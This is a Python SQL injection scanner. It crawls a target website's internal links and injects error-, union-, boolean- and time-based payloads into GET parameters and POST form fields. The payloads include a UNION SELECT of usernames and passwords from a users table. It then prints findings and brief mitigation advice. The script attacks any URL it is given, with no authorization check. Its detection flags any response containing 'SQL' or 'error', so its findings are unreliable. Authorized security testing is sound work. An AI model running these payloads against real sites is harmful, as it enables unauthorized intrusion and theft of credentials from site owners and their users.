import requests
from bs4 import BeautifulSoup
from urllib.parse import urlparse, urljoin, parse_qs, urlencode
import logging
import time
import sys

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[logging.StreamHandler(sys.stdout)]
)

class SQLInjectionScanner:
    def __init__(self, url):
        self.url = url
        self.visited_links = set()
        self.results = []
        self.stop_scanning = False
        self.sql_payloads = {
            'error_based': ["'", "' OR '1'='1' --", "' OR '1'='2' --", "' OR '1'='0' --"],
            'union_based': ["' UNION SELECT NULL --", "' UNION SELECT username, password FROM users --"],
            'boolean_based': ["' AND '1'='1' --", "' AND '1'='2' --"],
            'time_based': ["' OR SLEEP(5) --", "'; WAITFOR DELAY '0:0:5' --"]
        }

    def find_internal_links(self, url, domain):
        internal_links = set()
        try:
            response = requests.get(url, timeout=10)
            response.raise_for_status()
            soup = BeautifulSoup(response.content, 'html.parser')

            for link in soup.find_all('a', href=True):
                href = link.get('href')
                full_url = urljoin(url, href)
                parsed_full_url = urlparse(full_url)

                if parsed_full_url.netloc == domain:
                    internal_links.add(full_url)

        except requests.RequestException as e:
            logging.error(f"Error while crawling {url}: {str(e)}")

        return internal_links

    def test_get_method(self, url):
        parsed_url = urlparse(url)
        params = parse_qs(parsed_url.query)

        for param in params.keys():
            for attack_type, payloads in self.sql_payloads.items():
                for payload in payloads:
                    if self.stop_scanning:
                        return
                    
                    sql_params = params.copy()
                    sql_params[param] = payload
                    sql_url = parsed_url._replace(query=urlencode(sql_params, doseq=True)).geturl()

                    try:
                        response = requests.get(sql_url, timeout=10)
                        if "SQL" in response.text or "error" in response.text:
                            result_message = f"SQL Injection found on GET method at URL: {sql_url} | Type: {attack_type.capitalize()}, Parameter: {param}, Payload: {payload}"
                            self.results.append(result_message)
                            print(result_message, flush=True)

                    except requests.RequestException as e:
                        logging.error(f"Error while testing {sql_url}: {str(e)}")

    def test_post_method(self, url, data):
        for param in data.keys():
            for attack_type, payloads in self.sql_payloads.items():
                for payload in payloads:
                    if self.stop_scanning:
                        return
                    
                    sql_data = data.copy()
                    sql_data[param] = payload

                    try:
                        response = requests.post(url, data=sql_data, timeout=10)
                        if "SQL" in response.text or "error" in response.text:
                            result_message = f"SQL Injection found on POST method at URL: {url} | Type: {attack_type.capitalize()}, Parameter: {param}, Payload: {payload}"
                            self.results.append(result_message)
                            print(result_message, flush=True)

                    except requests.RequestException as e:
                        logging.error(f"Error while testing {url}: {str(e)}")

    def crawl_and_test(self):
        domain = urlparse(self.url).netloc

        def crawl(url):
            if url in self.visited_links or self.stop_scanning:
                return
            self.visited_links.add(url)

            try:
                response = requests.get(url, timeout=10)
                response.raise_for_status()
                soup = BeautifulSoup(response.content, 'html.parser')

                print(f"Scanning URL: {url}", flush=True)
                self.test_get_method(url)

                forms = soup.find_all('form')
                for form in forms:
                    form_method = form.get('method', 'get').lower()
                    form_action = form.get('action', '')
                    if not form_action.startswith('http'):
                        form_action = urljoin(url, form_action)
                    
                    inputs = form.find_all('input')
                    form_data = {input_tag.get('name'): input_tag.get('value', '') for input_tag in inputs if input_tag.get('name')}

                    if form_method == "post":
                        self.test_post_method(form_action, form_data)

                internal_links = self.find_internal_links(url, domain)
                for link in internal_links:
                    if self.stop_scanning:
                        return
                    crawl(link)
                    time.sleep(1)

            except requests.RequestException as e:
                logging.error(f"Error while crawling {url}: {str(e)}")

        crawl(self.url)

    def print_final_report(self):
        print("\n--- SQL Injection Scan Report ---", flush=True)
        if not self.results:
            print("No SQL injection vulnerabilities found.", flush=True)
        else:
            for result in self.results:
                print(result, flush=True)
            print("\nMitigations:", flush=True)
            print("1. Use parameterized queries (prepared statements).", flush=True)
            print("2. Use ORM frameworks to abstract direct SQL queries.", flush=True)
            print("3. Ensure input validation and sanitization.", flush=True)

if __name__ == "__main__":
    try:
        if len(sys.argv) != 2:
            print("Usage: python sql_injection.py <target_url>", flush=True)
            sys.exit(1)

        website_url = sys.argv[1]
        print(f"Starting SQL injection scan for: {website_url}", flush=True)
        
        scanner = SQLInjectionScanner(website_url)
        scanner.crawl_and_test()
        scanner.print_final_report()
        
        print("SQL injection scan completed", flush=True)
    except KeyboardInterrupt:
        print("SQL injection scan interrupted by user", flush=True)
    except Exception as e:
        print(f"Error during SQL injection scan: {str(e)}", flush=True)